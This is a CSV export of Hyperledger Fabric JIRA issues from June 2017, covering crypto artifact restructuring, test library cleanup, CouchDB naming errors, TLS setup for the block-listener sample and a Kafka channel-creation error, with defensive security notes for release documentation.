 ",,binhn,C0rWin,ChristopherFerris,joe-alewine,JonathanLevi,mastersingh24,rmohta,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,FAB-4546,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3040,,,,,,,,,"1|hzy57r:",,,,,,,,,,,,,,,,,,,,,,,binhn,C0rWin,ChristopherFerris,joe-alewine,JonathanLevi,mastersingh24,rmohta,yacovm,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 2:29 AM;binhn;FAB-4894

The peer communicates with its chaincodes via `chaincodeListenAddress` configuration in `core.yaml` file. This connection is not TLS-mutual auth, so it is strongly recommended to assign a protected address to `chaincodeListenAddress` in production environment to ensure no external entities may connect to this address.;;;","22/Jun/17 2:38 AM;binhn;FAB-3535

If using CouchDB, the password configuration `LEDGER_COUCHDBCONFIG_PASSWORD` is recommended to pass as an environment variable. If stored in the `core.yaml` file, the file must be access control protected to prevent unintended users from discovering the password. Ideally, permission to launching the peer executable, couchDB, access to the couchDB socket and access to `core.yaml` must only be granted to a trusted user group to administer the Fabric environment.;;;","22/Jun/17 2:52 AM;binhn;FAB-4824

A client application registers with a peer in the same organization (same root CA) to receive events. That is, the peer is trusted not to forward client's event registration request to other peers to impersonate the client, or to leverage event-related client requests to escalate its access rights in any way. This assumption must hold even if the peer is revoked by its organization.;;;","22/Jun/17 2:55 AM;binhn;Running the peer as root is *not* recommended because any vulnerability in the peer could be used by an adversary to gain admin rights on the machine.;;;","22/Jun/17 3:00 AM;binhn;Security sensitive files such as keystore, configuration, and production file system path must be read-writable only to the user that starts and owns the fabric server; group and world permissions should be empty. ;;;","23/Jun/17 12:02 AM;yacovm;* When setting up a peer that is to be used as anchor peer, always define an [external endpoint|https://github.com/hyperledger/fabric/blob/master/sampleconfig/core.yaml#L158] for that anchor peer. An external endpoint is an endpoint (host:port) that is reachable from foreign organizations.

* Never set up a [bootstrap |https://github.com/hyperledger/fabric/blob/master/sampleconfig/core.yaml#L91]peer to be an endpoint of peer(s) not from your orgs,
this would *not* work (it's written in the core.yaml though, not 100% sure if it's needed to add to the release notes)

* Do not use the same certificate for different peers, always use a unique one for each peer.;;;","24/Jun/17 8:12 AM;ChristopherFerris;ok, so I had NO idea that this even existed, because it was not linked to the release JIRA task.

 

For reference, there is a file release_notes/<release>.txt that we can and should use for this. If you have some recommended text, then create the file and/or edit it and just leave the date etc blank. However, once we tag the release, it is too late to change this, because it is permanent https://github.com/hyperledger/fabric/releases/tag/v1.0.0-rc1;;;","22/Mar/18 10:41 PM;joe-alewine;Can this be closed as ""Done""?;;;","30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify e2e integration crypto artifacts to support new structure,FAB-4912,18521,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,22/Jun/17 1:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 11:51 PM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-sdk-node,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";22/Jun/17 6:26 PM;mastersingh24;7200",,7200,0,7200,100%,7200,0,7200,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy57z:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 2:30 AM;mastersingh24;Need to do the following:
 * Add tlscacerts folder to the org MSPs and copy existing CA there (so things do not break)
 * Regenerate configtx artifacts;;;","22/Jun/17 6:26 PM;mastersingh24;https://gerrit.hyperledger.org/r/10999;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Two different assert packages are used in unit tests,FAB-4913,18522,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shimos,shimos,shimos,22/Jun/17 3:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 10:57 AM,v1.0.0-beta,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"In the unit test programs in Fabric, two assert packages are currently used:
-	github.com/stretchr/testify/assert
-	github.com/docker/docker/pkg/testutil/assert

Because the interfaces of these two libraries are slightly different from each other and because the majority use the former, all the test codes should use the former assert library.",fabric commit cefe788badfab9fede8fc0542c7b2ae4ec44abf8,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy587:",,,,,,,,,,,,,,,,,,,,,,,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 4:53 AM;shimos;CR is https://gerrit.hyperledger.org/r/#/c/10955/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger performance test: CouchDB test fails to start due to ledger name non-conformation,FAB-4914,18523,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,22/Jun/17 3:59 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Nov/17 12:55 AM,,,,v1.0.0,,fabric-quality,,,,,,0,quality,Quality,,,,,"The ledger performance test with CouchDB (using LTE tool) fails to start,  with following error:
{code:java}
Error during CouchDB CreateDatabaseIfNotExist() for dbName: chain_0000  error: databaseName 'chain_0000' does not matches pattern '[a-z][a-z0-9.-]*'{code}
This is due to the recently added extra layer of name-checking in CouchDB:
 [https://gerrit.hyperledger.org/r/#/c/10541/1/core/ledger/util/couchdb/couchdbutil.go]
 The LTE test uses underscore (""_"") in the name of the database (i.e. channel name), which is now not allowed.

Solution: Change LTE test to use other character than underscore (e.g. hyphen) in the database name. ",,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy58f:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"18/Jul/17 12:10 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/11619/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
couchdb and other first network cleanup,FAB-4916,18525,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,22/Jun/17 4:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 10:52 PM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-docs,fabric-samples,,,,,0,,,,,,,"dave.enyeart 2:57 AM
 
@cbf I’ve run through the complete Build Your First Network. A few minor issues:
1) The network name issue - already being worked: [https://gerrit.hyperledger.org/r/#/c/10913] 
2) The [byfn.sh|http://byfn.sh/] assumes /bin is in a peer directory to /first-network, while the manual instructions assume that /bin is in a subdirectory of /first-network. Which one is correct?
3) The Using CouchDB section uses marbles02 chaincode (JSON based), however the marbles02 chaincode is not available as an example within /first-network. Do we want to copy marbles02 into fabric-samples? (I don’t like having multiple copies in source, ‘fabric' and 'fabric-samples', due to dual maintenance concerns. I assume we’ll eventually remove them from ‘fabric’?)
4) In the doc the manual instructions still reference -p during chaincode instantiate. -p has been removed. This causes an error.
5) In the doc there are some old section name references, which do not exist after the doc refactor - can be fixed together with (4)",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy58n:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,mergify/bp/release-2.2/pr-4374,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,main,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,mergify/bp/release-2.2/pr-3750,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,release-2.5,release-2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix docs for FAB-4916,FAB-4917,18526,18525,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,ChristopherFerris,ChristopherFerris,ChristopherFerris,22/Jun/17 4:37 AM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,v1.0.0-beta,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,,,,,,address documentation aspects of FAB-4916,,ChristopherFerris,fredbi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy58v:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,fredbi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Oct/17 6:55 PM;fredbi;Hello. I've been playing around with first-network, customizing it and mixing it with some components from fabcar sample.

 

Some documentation issues I have noticed:
 * doc does not reflect the options available in byfn.sh (-s and -f)--
 * therefore, the paragraph related to couchdb is not easy to understand and requires some code digging to figure out (1) HOW couchdb may be setup and (2) HOW generating a config with e2e template. Best to be explicit : ./byfn.sh -m up -s couchdb
 * best to be more explicit about exposing a couchDB backdoor port by stating this is the default configuration in this sample

""Why CouchDB"" section is troubling and in my opinion, should be skipped altogether, with a link to some more advanced material on using couchdb with Fabric, unrelated with the ""first-network"" example.
 * Talks about ACL support in CouchDB raise an interesting point
 ** However, my instinct tells me that ACL at db user level is probably not workable when used from a chaincode, which connects with a predefined user
 ** Discussing / Documenting such advanced possibilities should definitely deserve a dedicated document on using Couch DB in the master doc index. In the current state, it is at best misleading.
 ** I believe the idea was to guide the reader to this: [https://wiki.apache.org/couchdb/HelpOnAccessControlLists#Basics]
 * Talks about JSON query is out of touch with the ""first-network"" sample: the example cc manipulates binary data which are automagically managed as attachments (which is an interesting feature in its on right)
 * Talks about replication / clustering in CouchDB is also interesting
 ** I recall some presentation when first releasing CouchDB support stating that replication MUST NOT be used (because of deferred commits/""eventual consistency"")
 ** However, it should be possible to use couchdb sharding
 ** I noticed in the couchdb config file ([https://github.com/yeasy/docker-hyperledger-fabric-couchdb/blob/master/payload/local.ini)] a small note on delayed commits parameter, which hints that the peer manages consistency (and, I gather, probably recovery). Peer savepoints are in my opinion an important topic to be further detailed in docs as it indicates how far we might use couchdb
 ** This point again should deserve a dedicated explanation in the master doc, and is probably out of scope for our ""first-network"" application

 ;;;","13/Jun/18 11:41 PM;ChristopherFerris;no longer relevant;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Different BatchTimeout for different channel in Fabric Beta Network,FAB-4919,18544,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jsong1230,jsong1230,22/Jun/17 10:59 AM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,,,,v1.0.0-beta,,fabric-samples,,,,,,0,,,,,,,"I would like to generate multiple channel with different batchtimeout and batchsize. Is it impossible in version beta?

I have modified configtx.yaml but all channels generated the same batch timeout and batch size block.",,jsong1230,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy59b:",,,,,,,,,,,,,,,,,,,,,,,jsong1230,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Failed to get block hash ... , error Entry not found in index",FAB-4920,18545,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,denyeart,zhaochong,zhaochong,22/Jun/17 11:08 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 10:52 PM,v1.0.0-alpha1,,,,,fabric-ledger,,,,,,0,,,,,,,"We execute the following commands through our own packaging code:

 
{code:java}
$ peer chaincode query -C """" -n qscc -c '{""Args"":[""GetChainInfo"",""ch5""]}'{code}
 

And we got information about BlockChainInfo: Height, CurrentBlockHash, PreviousBlockHash.

Then we execute the following command at the terminal:

 
{code:java}
$ peer chaincode query -C """" -n qscc -c '{""Args"":[""GetBlockByHash"",""ch5"", ""d8a31d315dae6158e5bd7b0243919306625913eda8e7eb56b12ad04248f6f3c5""]}' -r{code}
 

Then the error message is returned as follows:
{code:java}
Error: Error endorsing query: rpc error: code = 2 desc = Failed to get block hash d8a31d315dae6158e5bd7b0243919306625913eda8e7eb56b12ad04248f6f3c5, error Entry not found in index{code}
Is it a hash value error? Is it CurrentBlockHash in BlockChainInfo or DataHash in BlockHeader?

 ",,denyeart,zhaochong,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy59j:",,,,,,,,,,,,,,,,,,,,,,,denyeart,zhaochong,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jun/17 10:52 PM;denyeart;The last block's hash would be the BlockChainInfo.CurrentBlockHash, which would also be the next block's PreviousHash.

Your problem is that you are passing a hex string, whereas GetBlockByHash expects a byte array.  I suggest to utilize SDK rather than CLI so that byte array can be passed.;;;","23/Jun/17 12:47 AM;denyeart;[~zhaochong] By the way, how did you parse out the data returned from qscc GetChainInfo?;;;","23/Jun/17 10:03 AM;zhaochong;[~denyeart] Thank you very much!

Using the exec library of golang to execute the GetChainInfo command, then use the proto library to parse the results to the ledger.proto, which may be similar to the operation of the SDK;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Can not run Block-listener / End-to-end run with TLS enabled fails,FAB-4921,18546,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,nnao,bhaskerchatterjee,bhaskerchatterjee,22/Jun/17 3:27 PM,27/Jul/18 6:11 AM,28/Oct/23 3:00 AM,22/Sep/17 10:29 PM,v1.0.1,,,Future,,fabric-samples,,,,,,0,Documentation,,,,,,"I try to run block-listener as described here [https://github.com/hyperledger/fabric/blob/master/examples/events/block-listener/README.md.] However, the end-to-end run fails with tls disabled. 
2017-06-22 05:56:15.046 UTC [grpc] Printf -> DEBU 006 grpc: addrConn.resetTransport failed to create client transport: connection error: desc = ""transport: failed to write window update: write tcp 172.18.0.7:47322->172.18.0.2:7050: write: broken pipe""; Reconnecting to \{orderer.example.com:7050 <nil>}
Error: Error connecting due to rpc error: code = Unavailable desc = grpc: the connection is unavailable

And, without disabling tls, the block-listener fails to run:
could not start chat. err: could not create client conn to 127.0.0.1:7053:rpc error: code = Internal desc = transport is closing
Error creating event client

I did docker inspect to find the ip address of the ""peer0.org1.example.com"", which is ""172.18.0.6"", and passed that in event-address while running block-listener. However, that throws the same error. I will appreciate any help with that.",,Amit04Patel,bhaskerchatterjee,denyeart,muralisr,nnao,wlahti,xiven,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy59r:",,,,,,,,,,,,,,,,,,,,,,,Amit04Patel,bhaskerchatterjee,denyeart,muralisr,nnao,wlahti,xiven,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 6:05 AM;nnao;It seems to need to disable tls in orderer. ORDERER_GENERAL_TLS_ENABLED=false in base/docker-compose-base.yaml;;;","29/Jun/17 6:08 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11237/;;;","11/Jul/17 2:25 AM;xiven;Is it possible to get the block-listener to run with TLS enabled?  If so, how?;;;","13/Jul/17 8:33 AM;nnao;[~xiven] No. block-listener cannot run with TLS enabled yet.;;;","18/Aug/17 4:22 AM;Clayton Sims;customer asking for this.....moving to highest

 ;;;","30/Aug/17 12:44 PM;muralisr;[~bhaskerchatterjee] The block-listener.go sample event client is not enabled for TLS. It can be enabled by modifying the program as follows
 * import ""strings"" and ""github.com/spf13/viper""
 * add the following code snippet in main() function

{code:java}
        // For environment variables.
        viper.SetEnvPrefix(""core"")
        viper.AutomaticEnv()
        replacer := strings.NewReplacer(""."", ""_"")
        viper.SetEnvKeyReplacer(replacer)
{code}
 * build block-listener with ""go build"" in the block-listener folder
 * after starting e2e_cli successfully, start the program as follows (all in one line)
{code:java}
CORE_PEER_TLS_ENABLED=true CORE_PEER_TLS_ROOTCERT_FILE=$GOPATH/src/github.com/hyperledger/fabric/examples/e2e_cli/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt ./block-listener -events-address=peer0.org1.example.com:7053 -events-mspdir=$GOPATH/src/github.com/hyperledger/fabric/examples/e2e_cli/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp -events-mspid=Org1MSP
{code}

I had to add *peer0.org1.example.com* to /etc/hosts to be 127.0.0.1 on my laptop so *-events-address=peer0.org1.example.com:7053*  will work.

 

Also note that you can make the e2e sample non-TLS by setting *xxx_TLS_ENABLED*=false (example CORE_PEER_TLS_ENABLED=false) in all the docker ""yaml"" files in e2e_cli/ and e2e_cli/base. With TLS disabled you don't need to modify the block-listener sample for TLS.

 

[~nnao] if you like do take the above changes and fix block-listener.go to enable it for TLS.;;;","31/Aug/17 11:34 PM;wlahti;[~nnao] I'm currently working on a new events service where registration occurs at the channel level instead of the peer, based on the eventhub service code. I pushed a CR yesterday to enable my listener sample to work with TLS: [https://gerrit.hyperledger.org/r/#/c/13001/]. If you'd like, I can update the block listener sample and readme with the relevant code/information.;;;","01/Sep/17 10:07 AM;nnao;[~muralisr] [~wlahti]

Thank you, you've been so helpful.

I pushed a CR that enable block-listener.go for TLS and update README.

https://gerrit.hyperledger.org/r/#/c/11237/;;;","07/Sep/17 12:39 AM;denyeart;Bugs do not require a release planning label, I will remove it.  Especially Highest bugs are prioritized for next release regardless.;;;","27/Jul/18 6:11 AM;Amit04Patel;Still getting error in starting with tls enabled 
CORE_PEER_TLS_ENABLED=true CORE_PEER_TLS_ROOTCERT_FILE=$GOPATH/src/github.com/hyperledger/fabric/examples/e2e_cli/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt ./block-listener -events-address=peer0.org1.example.com:7053 -events-mspdir=$GOPATH/src/github.com/hyperledger/fabric/examples/e2e_cli/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp -events-mspid=Org1MSP
Event Address: peer0.org1.example.com:7053
could not start chat. err: rpc error: code = Unavailable desc = transport is closing
Error creating event client
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update balance-transfer app to use new crypto structure,FAB-4923,18550,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,22/Jun/17 6:25 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jun/17 12:03 AM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-sdk-node,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";23/Jun/17 10:09 PM;mastersingh24;3600",,3600,0,3600,100%,3600,0,3600,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5af:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 10:10 PM;mastersingh24;https://gerrit.hyperledger.org/r/11055;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Kafka based Ordering - Create Channel Error,FAB-4925,18553,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,,sait,sait,22/Jun/17 7:40 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Jul/17 11:17 AM,v1.0.0,,,WON'T FIX,,fabric-orderer,,,,,,0,,,,,,,"I tried to setup the kafka-based ordering network with the below configuration

           - 4-kafka, 3-zookeeper, 3-orderer, 3-peers, 3-ca

and instantiate the chaincode.

But i am getting the below issue when creating channel

Constructing channel kafcc

Orderers >>>>>>>>>>> [org.hyperledger.fabric.sdk.Orderer@24313fcc|mailto:org.hyperledger.fabric.sdk.Orderer@24313fcc]

org.hyperledger.fabric.sdk.exception.TransactionException: New channel kafcc error. StatusValue 400. Status BAD_REQUEST

            at org.hyperledger.fabric.sdk.Channel.<init>(Channel.java:240)

            at org.hyperledger.fabric.sdk.Channel.createNewInstance(Channel.java:1222)

            at org.hyperledger.fabric.sdk.HFClient.newChannel(HFClient.java:127)

            at com.cognizant.gto.digital.blockchain.JoinChannel.constructChannelAndJoin(JoinChannel.java:272)

            at com.cognizant.gto.digital.blockchain.JoinChannel.setup(JoinChannel.java:188)

            at com.cognizant.gto.digital.blockchain.JoinChannel.main(JoinChannel.java:87)

New channel kafcc error. StatusValue 400. Status BAD_REQUEST",,jyellick,kchristidis,rickr,sait,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jul/17 2:15 PM;sait;kafka_docker_logs;https://jira.hyperledger.org/secure/attachment/11533/kafka_docker_logs",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5b3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,kchristidis,rickr,sait,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/17 8:49 PM;rickr;Moved this to Orderer does not appear to be SDK error and suspect user error but Orderer and Kafka will need to find out why that error occurred.;;;","30/Jun/17 12:42 AM;jyellick;[~sait] This is not enough information to diagnose your problem.  Please include a full set of steps to reproduce your problem, as well as logs from the orderer at debug level.;;;","30/Jun/17 5:52 PM;sait;Steps to reproduce this issue:
1. With the help of Cryptogen tool generate the certificates for 3 Orgs, 3 Peers, 3 orderer and 3 CA configured in crypto-config.yaml
2. Once created certificates, generate the channel.tx with the help of configtxgen , configtx.yaml for 3 orgs, 3-orderers with order type kafka
3. Now configure docker-compose.yaml for the above config and up the network.
4. With the help of java application create channel and it will give the above issue.;;;","02/Jul/17 5:17 AM;kchristidis;[~sait]: Thanks for providing the list of steps.

As Jason noted, you'll also need to provide logs from the orderer at the DEBUG level, otherwise there's not enough info to proceed.;;;","04/Jul/17 8:55 AM;kchristidis;Sait: Please attach the orderer logs only. This seems to be a dump of every node's activity.;;;","12/Jul/17 11:17 AM;kchristidis;A week w/o update, closing. Feel free to re-open with right logs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
